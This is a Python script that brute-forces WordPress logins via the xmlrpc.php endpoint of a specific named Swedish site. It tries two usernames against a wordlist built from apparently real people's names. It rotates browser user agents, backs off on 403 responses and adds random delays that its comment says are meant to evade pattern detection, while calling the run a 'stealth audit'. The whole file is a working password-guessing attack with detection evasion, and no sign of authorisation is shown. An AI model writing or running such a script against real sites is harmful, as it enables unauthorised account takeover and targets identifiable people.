import urllib.request
import urllib.error
import time
import random

url = "https://doktorbajskorv.se/xmlrpc.php"
users = ["nalle", "lompa"]

passwords = [
    "password", "secret", "123456", "nalle123", "lompa123", "bajskorv", "admin", "admin123",
    "nalle", "nalle1", "påhlsson", "pahlsson", "nallepahlsson", "nallepåhlsson", "nallan", "bear",
    "lompa", "lompa1", "thomas", "andersson", "thomasandersson", "lompathomas"
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
]

for user in users:
    print(f"\n[*] Starting stealth audit for user: {user}")
    for pwd in passwords:
        xml_data = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{user}</string></value></param>
    <param><value><string>{pwd}</string></value></param>
  </params>
</methodCall>""".encode('utf-8')

        req = urllib.request.Request(
            url, 
            data=xml_data, 
            headers={
                'Content-Type': 'text/xml',
                'User-Agent': random.choice(user_agents)
            }
        )
        
        try:
            with urllib.request.urlopen(req) as response:
                res_body = response.read().decode('utf-8')
                if "faultCode" in res_body:
                    print(f"[-] Failed: {user}:{pwd}")
                else:
                    print(f"\n[+] SUCCESS! Credentials found -> {user}:{pwd}")
                    exit(0)
                    
        except urllib.error.HTTPError as e:
            print(f"[!] HTTP Error {e.code} with {user}:{pwd} - {e.reason}")
            if e.code == 403:
                print("[!] 403 Forbidden encountered. Backing off for 30 seconds...")
                time.sleep(30)
        except Exception as e:
            print(f"[!] Error with {user}:{pwd}: {e}")
        
        # Random jitter delay between 4 to 8 seconds to evade pattern detection
        time.sleep(random.uniform(4.0, 8.0))

print("\n[*] Stealth audit completed.")
